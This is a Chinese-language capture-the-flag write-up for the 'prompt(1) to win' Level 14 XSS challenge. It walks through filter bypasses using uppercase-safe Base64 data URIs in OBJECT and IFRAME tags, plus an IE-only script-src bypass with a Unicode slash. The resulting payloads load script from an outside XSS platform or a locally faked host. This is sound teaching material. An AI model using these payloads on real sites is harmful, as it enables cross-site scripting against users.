## [[prompt(1) to win](http://prompt.ml)] [[Level E - Base64](http://prompt.ml/14)] [[解题报告](http://exp-blog.com/2019/03/29/pid-3762/)]

------

## 题目

```javascript
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
}
```

## 解题方法一（Base64）

### 前置知识

- Data URIs：[https://www.jianshu.com/p/ea49397fcd13](https://www.jianshu.com/p/ea49397fcd13)
- Base64 编码原理：[https://blog.csdn.net/rj042/article/details/48733257](https://blog.csdn.net/rj042/article/details/48733257)

### 代码分析

因为最后输出是 `<img src="' + input + '">` ，不妨构造 input 探针 `0" onerror=prompt(1)` 看看效果：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/01.png)

虽然可以闭合双引号 `"` ，但是空字符 `\s` 被过滤成了下划线 `_` ，而且所有字符被转换成了大写，所以直接注入是不可能的。

其实代码虽然过滤了很多字符，但唯独把 Data URIs 要用到的字符留下了。

而且 `input.replace(/\/\/|\w+:/g, 'data:')` 这行明显就是提示。

因此不难想到，这题应该是要用 [Data URIs](https://www.jianshu.com/p/ea49397fcd13) 解题，而 payload 应该就是要用 Base64 编码到 Data URIs 中。

------------

### Data URIs

不过 Data URIs 被浏览器严格限制，导致在 HTML 标签中，能够使用 Data URIs 的标签极其有限。

已知的只有 4 个：

- `<img>` 标签的 `src` 属性
- `<object>` 标签的 `data` 属性
- `<iframe>` 标签的 `src` 属性
- `<a>` 标签的 `href` 属性

但是 `<img>` 标签只能解析图片数据，即使在 Data URIs 中注入 JS 代码也是无法执行的。

而本题默认使用的正是 `<img>` 标签，所以我们需将其闭合，然后用别的标签代替。

------------

### 构造探针

不妨先用 `<object>` 标签构造一个探针看看效果，格式为：

```html
<!-- 注意：因为空格被过滤成了下划线，所以 object 与 data 之间的空格要用 / 代替 -->
"><object/data="data:text/html;base64,base64_encode(xss js code)
```

其中 `base64_encode(xss js code)` 就是我们要注入的 js 代码，但是需经过 base64 编码。

假如要注入的 JS 是 `<script>prompt(1)</script>` ，

将其用 base64 编码后为 `PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=` , 于是得到探针：

```html
"><object/data="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=
```

不过从输出效果来看，我们构造的内容，除了 `data:` 之外，全部都变成了大写字母：

```html
<img src=""><OBJECT/DATA="data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=">
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/02.png)


------------

### 选择浏览器

对于这部分代码，因为被转换成了大写，需要知道哪部分还有效，哪部分已经失效，失效了怎么处理。

```html
<OBJECT/DATA="data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=">
```

- `OBJECT/DATA` ：这部分变大写是没关系的，标签名和属性名对大小写不敏感
- `TEXT/HTML;BASE64` ：这部分变大写会令到 Data URIs 失效（除了 FireFox 浏览器，其他浏览器都不能识别）
- `PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=` ： Base64 编码是大小写敏感的，全大写就无法解码了


先不管 Base64 编码变成大写的问题，手工将其改回去 `PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=`，

然后用 Chrome 浏览器打开，`TEXT/HTML;BASE64` 变大写了确实是无法解析的：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/03.png)

但是用 FireFox 浏览器则可以解析并执行了 JS 代码：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/04.png)

由此决定了，**这个挑战只能通过 FireFox 浏览器去做**。

------------


### Base64 编码原理

剩下的问题是，怎么令到被转换成全大写的 Base64 编码，可以被解码成原本的 JS 代码 ？

其实答案也很简单：

构造一个 JS 代码，其功能是实现 `prompt(1)` 执行，且经过 Base64 编码后，是全大写字母。

------------


严格来说，其实不需要全大写， Base64 编码的字符范围是 `a-z`、 `A-Z`、 `0-9`、 `/`、 `+`、 `=` 。

而在本题中，只有 `a-z` （被转换成 `A-Z` ）和 `+` （被转换成 `_` ）是不能用的。

那么我们只需要所构造的 JS 代码经过 Base64 编码后只含有 `A-Z`、 `0-9`、 `/`、 `=` 范围内内的字符，就可以令题目中把 Base64 编码转换成大写的逻辑就没有任何作用了。


------------

而要构造这么一个 Base64 编码，就需要先了解其编码原理。

详细可以参看这篇文章 《[Base64编码原理](https://blog.csdn.net/rj042/article/details/48733257)》 ，说得很清楚。

大致意思就是：Base64 编码的时候，被编码的字符串会顺序以每 3 个字符为一组，每一组根据固定的映射表编码成 4 个字符。换言之，连续的 3 个字符直接影响了这个局部区域编码后的结果，相隔太远的字符是无法对这个区域造成干涉的。

那么要构造一个编码后不存在  `a-z` 和  `+` 的 JS 字符串是完全有可能的。

------------


### 构造 Base64 编码

这部分就需要漫长的耐心了去试错了（有兴趣的同学可以根据 Base64 编码原理自己写算法实现），我用了几个小时构造了 2 个满足条件的 JS 代码。

这两个 JS 代码会执行 `prompt(1)` 功能，Base64 编码后不存在  `a-z` 和  `+` 字符。

先来看看这两个 JS 是什么样的，再分析。

------------

第一个 JS 代码是这样的（注意一个空格、一个换行都不能错）：

```javascript
  <SCRIPT /
SRC  
= 
  
HTTPS:XSS%2E%54%46/TOH>
</SCRIPT
 >
```

Base64 编码后是：

`ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=`

------------

第二个 JS 代码是这样的（注意一个空格、一个换行都不能错）：

```
  <SCRIPT /
SRC  
= 
  
HTTPS:E.XP>
</SCRIPT
 >
```

Base64 编码后是：

`ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6RS5YUD4KPC9TQ1JJUFQKID4=`


------------

首先无论是哪个 JS 代码，我都没有直接对 `prompt` 编码，原因很简单，这个 JS 函数不但长度超过了 3 个字符，而且它单独编码后含有小写字母。根据 Base64 编码原理可以知道，编码是每 3 个字符为一组的，这 3 个字符直接决定了局部区域的编码结果。而连续 6 个字符，即使在前面或后面追加其他字符进行错位，始终无法控制中间字符的组合方式。而 `prompt` 作为 JS 函数关键字，是不可能从中间破开或者做大小写变换的，不然即使成功构造了无小写字母的 Base64 编码，解码后也无法执行。

所以我构造的这两个 JS 代码，都借助了 XSS 平台，通过 URL 调用 XSS 平台的 JS 代码，从而实现 `prompt(1)` 的调用。

区别在于，第一个 JS 代码使用的是第三方的 XSS 平台，因为域名、URL 是第三方控制的，所以要使得 URL 在 Base64 编码后能满足条件，就需要运气，主要依赖第三方平台分配了怎样的一个 URL 字符串。

而第二个 JS 则是我在本地搭建的 HTTP 服务器，域名、URL 等等都是我在本地虚构的，换言之我只需要先构造满足条件的 Base64 编码，再反过来配置域名和 URL 就可以了，简单而有效。

接下来就说明一下这两种 JS 代码的构造方法。

------------

### 利用 XSS 平台完成挑战

我使用的 XSS 平台是 [http://xss.tf](http://xss.tf) ，不图什么，只图域名够短，用来构造 Base64 编码时会更简单。

随便创建一个项目，项目代码自定义为 `prompt(1)` 即可。

因为 XSS 平台分配的 URL 都是随机的，所以关键在于分配给我的 URL 能不能用来构造成不含  `a-z` 和  `+` 字符的 Base64 编码。

假如不能，则只能重新创建一个项目以获取另一个 URL 。

很幸运地，我试到第 3 次，就得到了 [http://xss.tf/tOH](http://xss.tf/tOH) 这个 URL ：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/05.png)

利用这个 URL ，我不断通过各种试错组合，得到了前面的第一个 JS 代码：

```javascript
  <SCRIPT /
SRC  
= 
  
HTTPS:XSS%2E%54%46/TOH>
</SCRIPT
 >
```

在试错的时候，我总结了几个技巧，不妨给大家借鉴一下：

- 推荐使用 Burp Suite 的 Decoder 编码器，可以即时看到 Base64 编码效果
- 这个 XSS 平台 [http://xss.tf](http://xss.tf) 会自动把 https 的请求转发到 http ，因此使用 http 或 https 都是可以的
- JS 中的标签名、属性名等不能用空字符破开
- URL 是大小写不敏感的，但不能使用空字符破开
- `HTTPS:` 在恰当的位置上得到的 Base64 编码是全大写的
- `HTTPS:` 后面可以不带 `//`
- `HTTPS:` 后面的 URL 部分可以使用 URL 编码，当单纯的字母无法构造大写编码时，试试 `%`
- URL 末尾可以利用参数符号 `?` 进行错位
- URL 开头可以利用 Basic Auth 进行错位 `user:pass@`（可参考 【[Level 04 - Basic Auth](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2004%20-%20Basic%20Auth)】）
- 大写字母 Base64 编码后更容易得到另一个大写字母
- 被编码的的字符串越短越容易控制


无论如何，前面利用 XSS 平台构造的 JS 代码，经过Base64 编码后得到：

`ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/06.png)

于是利用它构造 payload 如下，并在 FireFox 浏览器提交，完成挑战：

```html
"><OBJECT/DATA="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/07.png)

> 注意：这题确实是有 BUG 的，虽然可以触发 `prompt(1)` ，但是却不会成功检测到

------------

### 利用本地 HTTP 服务器完成挑战

利用 XSS 完成挑战后，我又在想，感觉依赖第三方随机分配的域名才能完成挑战，实在太投机了，有没有办法我自己去控制域名，掌握主导权 ？

答案是肯定的。

其实从 [http://prompt.ml/](http://prompt.ml/) 某些题目依赖本地浏览器类型才能完成挑战就知道，它校验 payload 是否正确是在本地做的，即它不会把我们构造的 payload 上传到远程服务器进行认证。

换言之，当我们使用 XSS 平台来完成某些挑战的时候，向 XSS 平台发起请求的不是 [http://prompt.ml/](http://prompt.ml/) 服务器，而是我们本地的浏览器。

也就是说，只要我们本地浏览器可以访问到的服务器，都可以作为 XSS 服务器 —— 例如：我们在本地搭建一个 HTTP 服务器，让它只返回 `prompt(1)` 。

本地搭建 HTTP 服务器用来做 XSS 服务器的好处是，我们几乎不用怎么担心 URL 能不能构造成全大写字母的 Base64 编码的问题，因为这个 URL （或者说这个域名）完全是可以在本地伪造的。只需要先设计一个字符串，使得它在 Base64 编码后是全大写字母，然后将它设置成域名就可以了。

多说无益，接下来来看看怎么做。


------------

搭建 HTTP 服务器可以使用 [Apache Httpd](https://httpd.apache.org/) ， Windows 下无脑安装即可。

安装完成后，先不忙着搭建服务器。

先构造 XSS 代码，其实就是前面提到的第二个 JS 代码：

```
  <SCRIPT /
SRC  
= 
  
HTTPS:E.XP>
</SCRIPT
 >
```

这个 JS 代码在 Base64 编码后不含 `a-z` 和 `+` ，满足要求：

`ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6RS5YUD4KPC9TQ1JJUFQKID4=`

那么现在要做的，就是把 JS 代码中构造的 URL `HTTPS:E.XP` 变成可以真正访问的域名。

在 HTTP 中，这个域名地址等价于 `https://e.xp` 。

[Apache Httpd](https://httpd.apache.org/) 默认情况下是通过 `http://127.0.0.1:80` 访问主页的，要使得它可以访问 `https://e.xp` ，修改两处即可：

- 修改 `%ApacheHttpd%/conf/extra/httpd-vhosts.conf` 文件，修改 `<VirtualHost>` 中的服务名为 `ServerName E.XP:80`
- 修改 `C:\Windows\System32\drivers\etc\hosts` 文件，增加一行 `127.0.0.1 E.XP` （相当于伪造 DNS）

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/08.png)

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/09.png)

完成这两处修改，启动 Apache Httpd 服务，就可以在本地访问 [https://e.xp](https://e.xp) 了。

> 注：虽然没有搭建 https 服务器，但这种情况下，https 的流量都默认会转发回 http，只是会提示不安全而已。有时间的同学可以在本地对自己的 http 服务做自签名认证，就可以伪造 https 服务器了。

但是这样改仅仅能访问主页而已，主页是不会触发 `prompt(1)` 的，为此还需要改两处地方：

- 在 `%ApacheHttpd%/htdocs` 目录下（即WEB目录）新建文件 `index.js` ，内容为 `prompt(1)`
- 修改 `%ApacheHttpd%/conf/httpd.conf` 文件，在 `DirectoryIndex` 后添加 `index.js`

这样只要访问 [https://e.xp](https://e.xp) 就会自动跳到 index.js 页面，然后触发 `prompt(1)`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/10.png)

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/11.png)


------------

至此，搭建本地 XSS 服务器完成，访问 [https://e.xp](https://e.xp) 就可以看到效果，跟使用 XSS 平台一样：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/12.png)

利用本地域名 [https://e.xp](https://e.xp) 的 Base64 编码构造 payload 如下，并在 FireFox 浏览器提交，完成挑战：

```html
"><OBJECT/DATA="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6RS5YUD4KPC9TQ1JJUFQKID4=
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/13.png)

------------


### 其他 payload

如果大家还没忘记的话，我在最开始就提到，Data URIs 可用的 HTML 标签有 4 个：

- `<img>` 标签的 `src` 属性
- `<object>` 标签的 `data` 属性
- `<iframe>` 标签的 `src` 属性
- `<a>` 标签的 `href` 属性

其中 `<img>` 标签是无法用来触发 JS 的，而 `<object>` 标签前面已经用过了。

实际上 `<iframe>` 标签也是可以完成挑战的，例如这两个 payload 均可：

```html
"><IFRAME/SRC="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=
```

```html
"><IFRAME/SRC="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6RS5YUD4KPC9TQ1JJUFQKID4=
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/14.png)
![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/15.png)

`<a>` 标签原本也是可以触发 JS 的，不妨构造这样的 payload 测试下：

```html
"><A/HREF="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=">link</A><IMG/SRC="
```

但是 [http://prompt.ml/](http://prompt.ml/) 似乎跟按钮有仇，死活不让点击超链。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/16.png)

不过即使能点击也没用，现代的浏览器为了避免 `<a>` 标签的 Data URIs 被用于跨站攻击，默认都是拦截掉请求了：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/17.png)

------------

## 解题方法二（Unicode）

### 前置知识

- [相对协议地址](http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/)
- [Unicode 字符编码](https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8)
- [`<script>` 异步执行属性 `async`](http://www.w3school.com.cn/html5/att_script_async.asp)


------------

### 黑魔法：MSIE

**这种解题方法只能在 MSIE（Microsoft IE）中使用**，而且版本要求是 IE 10 以上。

关键在于使用 Unicode 编码绕过题目的 `//` 过滤，在 IE 10 中，第二个正斜杠是允许使用 Unicode 的 `〳` 代替的。

> 注：[`〳` 其实就是中文的笔画符号【撇】，编码是 U+3033](https://www.compart.com/en/unicode/U+3033)

利用[前面](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2014%20-%20Base64#%E5%88%A9%E7%94%A8-xss-%E5%B9%B3%E5%8F%B0%E5%AE%8C%E6%88%90%E6%8C%91%E6%88%98)已经在 XSS 平台构造好的项目地址（[http://xss.tf/tOH](http://xss.tf/tOH)），构造 payload 如下：

```html
"><script/src="/〳xss.tf/tOH
```

注意到除了利用 Unicode 编码绕过 `//` 过滤，还通过隐去 `http:` 绕过了 `\w:` 过滤。

之所以可以隐去 `http:` ，是因为在 html 的 `src` 属性中可以使用 [相对协议地址](http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/) 原理：此时前端获取资源时会根据所访问 URL 的协议而自适应（即自动识别 http 或 https）。

但是这个 payload 因为引用的是外部资源，所以虽然我们在 XSS 平台 [http://xss.tf/tOH](http://xss.tf/tOH) 构造好了 `prompt(1)` ，但是它并不会被执行。

为此可以修改 payload 为：

```html
"><script/async/src="/〳xss.tf/tOH
```

看到加了 `async` 属性，其效果是一旦 `src` 引用的脚本资源可用，就会异步执行。

在 IE 10 或 IE 11 上输入这个 payload ，完成挑战：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/18.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
